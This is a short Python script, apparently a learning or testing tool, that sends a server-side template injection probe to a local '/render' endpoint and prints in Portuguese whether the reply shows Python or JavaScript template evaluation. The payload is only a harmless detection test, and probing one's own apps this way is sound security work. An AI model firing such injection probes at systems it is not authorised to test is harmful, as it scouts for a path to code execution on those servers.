import requests
import time
import json 
import re

def runSearchExploit():
    url = "http://localhost:5000/render"

    payload = {'input': '{{\'acacio\'.upper()}}'}

    response = requests.post(url, data=payload)

    mockReturnPython = "ACACIO"
    mockReturnJavaScript = "Function() { [native code] }"

    mockOnPython = False
    mockOnJavaScript = False

    if mockOnPython == True:
        content = mockReturnPython
    elif mockOnJavaScript == True:
        content = mockReturnJavaScript
    else:
        content = bytes.decode(response.content, 'utf-8')

    print('Retorno POST..: ', content)

    if mockOnPython or mockOnJavaScript or response.status_code == 200:
        padraoPython = r'\bACACIO\b'
        padraoJavaScript = re.escape("Function() { [native code] }")

        matchedPython = re.search(padraoPython, content)
        matchedJavaScript = re.search(padraoJavaScript, content)

        print('matchedPython', matchedPython)
        print('matchedJavaScript', matchedJavaScript)

        if matchedPython:
            print('Vulnerabilidade em Pyton')  
            print("Matched: ", matchedPython.group())
        elif matchedJavaScript:
            print('Vulnerabilidade em JavaScript')
            print("Matched: ", matchedJavaScript.group())

runSearchExploit()
